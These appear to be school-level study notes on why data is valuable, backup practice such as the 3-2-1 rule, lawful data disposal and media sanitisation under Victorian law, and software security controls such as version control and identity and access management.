Definition

◆Why Data Is Valuable

Data is valuable to individuals and organisations alike. If a hard disk crashed tomorrow with no backup, the things lost would be original and irreplaceable - they took real time and effort to create, and can't simply be downloaded again.

Individuals

✎What You'd Lose at Home

Unfinished or completed school work, projects, photos, and saved articles. Losing access to an email account can also mean losing sent/received emails, your address book, bookmarks, and all the preferences you've set up in your favourite programs.

Businesses

▣What a Business Would Lose

  • Client lists, payroll information, tax records
  • Accounting and transaction details
  • Records of who owes the business money, and who it owes
Impact

⚠Why It Would Be Catastrophic

  • The business wouldn't know its customers or how to contact them
  • Staff couldn't be paid, and income would drop to zero
  • The tax department and creditors could pursue legal action
  • Trade secrets would be lost, and reputation as a trustworthy organisation would suffer
  • A privacy policy violation could occur if personal information is damaged or released

Computers can be replaced almost instantly since they're insured - the data on them can't be. Re-entering everything lost in a major system crash could take months or years and cost a fortune.

Definition

◆Data Security

Making sure only the people who should be able to read the data can read it, and only the people who should be able to write it can write it. Implemented through equipment such as a network operating system with user authentication, and measures such as organisational password policies.

▣Characteristics of Secure Information

CharacteristicWhat It Means
ProtectedUser authentication protects information with passwords. Firewalls, anti-malware and antivirus software are kept up to date. Physical storage is protected with access restrictions, locks, guards and/or alarms.
ConfidentialPeople only have access to information they need. The Privacy and Data Protection Act 2014 requires that sensitive information only be made available on a 'need to know' basis.
Risk managedRegular backups are taken in case of data loss. Safety equipment (ventilation, fire extinguishers, alarms) is fitted in secure data centres, and an emergency business continuity plan is in place.
Definition

◆Backups

A copy of data that can be recovered in the event of a primary data failure, allowing data to be restored from an earlier point in time. Primary failures can result from hardware or software failure, data corruption, or human-caused events such as malware or accidental deletion.

Best Practice

✎Frequency & Multiple Methods

The more time between backups, the more potential data loss when recovering. Retaining multiple copies gives the flexibility to restore to a point unaffected by corruption or attack. A good backup system typically includes:

  • Daily incremental backups to a portable device and/or cloud storage
  • End-of-week server backups
  • Quarterly and yearly server backups

It's vital to regularly check and test that you can actually restore your data from a backup.

3

◉Three Copies

Keep at least three copies of any important files or data - the original and two backups.

2

◉Two Media Types

Keep the files or data on two different types of media.

1

◉One Offsite

Keep one copy offsite, away from the original location.

Variation

⌁3-2-1-1 Rule

The 3-2-1 rule is a minimum starting point. A common variation keeps two offsite copies instead of one: one in the cloud (online), and one that is both offsite and offline - e.g. an external hard drive or tape stored at a different physical location.

▣Essential Eight: Daily Backups Maturity

The Australian Signals Directorate's Australian Cyber Security Centre (ACSC) treats daily backups as essential to protect against malware and recover data and system availability. All businesses should aim for maturity level three.

Definition

◆Data Disposal

The destruction, transfer, damage or alteration of data.

Legislation

⚖Victorian Information Privacy Principles

Under IPP 4.2, organisations must take reasonable steps to destroy or permanently de-identify personal information no longer needed for any purpose. IPP 1.1 suggests minimising the need to dispose of data in the first place, by limiting how much identifiable information is collected.

Public Records

▣Public Records Act 1973

Public records cannot be destroyed unless authorised. The Public Records Office Victoria (PROV) can issue three types of authority to destroy:

  • Normal Administrative Practice (NAP)
  • Retention and Disposal Authority (RDA)
  • Single Instance Disposal Authority (SIDA)

Once authority to destroy is issued, information must be destroyed or de-identified, unless another legitimate purpose exists for retaining it.

NAP

✎Normal Administrative Practice

Organisations are authorised to destroy certain records as part of their normal administrative practice, including:

  • Transitory messages - e.g. calendars, personal emails
  • Rough working papers - e.g. rough meeting notes
  • Drafts not intended for further reference
  • Copies retained for reference purposes only
  • Published material not included in the organisation's records
Physical

◆Destroying Physical Information

Suitable methods for papers, photographs and films include:

  • Shredding - cross-shredding may be needed for sensitive documents
  • Pulping - reduces paper to fibres
  • Burning - only as a last resort, in an appropriate industrial facility
Digital

⚠Deletion Doesn't Mean Destruction

Deleting digital information only removes the pointer (the file name and directory path) to that information. The actual data is gradually overwritten by new data over time - until it's fully overwritten, it can still be retrieved with recovery tools.

Digital

◈Sanitisation Methods

Sanitisation is the process of erasing or overwriting information on digital media. The method chosen depends on the information's classification and a risk assessment of its sensitivity.

  • Clearing - information is overwritten and hidden under nonsensical data so it can't be retrieved via disk or file recovery utilities
  • Purging - information is randomised so it can't be reconstructed, even using nonstandard systems outside its usual environment (a "laboratory attack")
  • Degaussing - recorded data is erased by demagnetising magnetic media
  • Destruction - the most extreme form; the media is drastically altered and can never be reused
Digital

▣Physical Destruction Methods

Shredding, disintegration, incineration, pulverisation, and melting. To ensure complete destruction, find and destroy all copies - including system backups, the cloud, and offsite storage. Where information is stored in the cloud, contracts should stipulate that all copies will be destroyed under retention and disposal requirements.

Caution

⚠Wiping Devices Properly

Un-wiped hard drives are sought after by scammers. Factory resetting and deleting data alone isn't enough to prevent recovery. For phones, tablets and solid state drives (SSDs), encryption can be used before resetting to prevent any remaining data from being recovered.

Security Controls in Software Development

Six essential security controls developers use to protect data, with a closer look at version control and identity & access management.

Context

◆Developers as Guardians of Data

Software powers schools, hospitals, banks, social media and government services - and all of it stores something precious: data. As developers, every design choice and every line of code can help protect (or accidentally endanger) users' personal data. Secure software development isn't just about the end product, it's about:

  • How the product is made
  • Who can access it
  • How it's stored
  • How it's maintained over time

Definition

◆Version Control

Also known as source control - a management strategy used to track and store changes to software development files across the whole project lifecycle. Without it, every change would overwrite the last, like an essay where old drafts vanish forever.

Tools

⌁Git & GitHub

Tools such as Git, and platforms such as GitHub, let developers safely make changes, fix bugs, experiment with new features, and undo mistakes - like an unlimited "undo" button with collaboration features built in. Code stored in repositories can be shared, reviewed and automatically backed up.

Benefit

▣Why It Matters for Teams

Repositories let teams restrict access, so only approved users can change critical files or merge code into the main project. Every change is recorded with who made it, when, and why - a complete history in case anything goes wrong. Malicious or poorly written code can be traced and removed.

Benefits

✎What Version Control Improves

  • Team productivity and collaboration
  • Team communication with a reliable solution
  • Fewer development errors and conflicts
  • Faster development time and more successful deployments
  • Customer satisfaction through more reliable software versions
Best Practice

◈Using It Effectively

Changes should be saved frequently and consistently, using comprehensible naming conventions. Teams without version control often don't know which changes have been made available to users, and end up with incompatible changes between unrelated pieces of work that must be painstakingly untangled.

Key Point

◉Both Tool and Safety Net

Version control protects source code from catastrophe - deliberate or accidental security or physical risks - and from the casual degradation of human error. In secure development, version control is both a collaboration tool and a safety net. As with any important data, regular backups should still be done.

Definition

◆Identity & Access Management (IAM)

Not everyone should have the keys to the kingdom. IAM is the practice of making sure that each person only has the access they need, nothing more.

Analogy

✎Like a School Building

Students, teachers and the principal all have access to different areas depending on their role. You wouldn't want a student wandering into the server room, and you wouldn't want just anyone editing school reports.

Tools

⚙How IAM Works

IAM uses login credentials, multi-factor authentication (MFA), and role-based permissions to keep systems organised and secure. This way, even if someone's password is stolen, the damage is limited.

Principle

◉Principle of Least Privilege

Give people the minimum access they need to do their job - for example, allowing a tester to view results but not change source code, or letting a junior developer work on a feature without touching the production database.
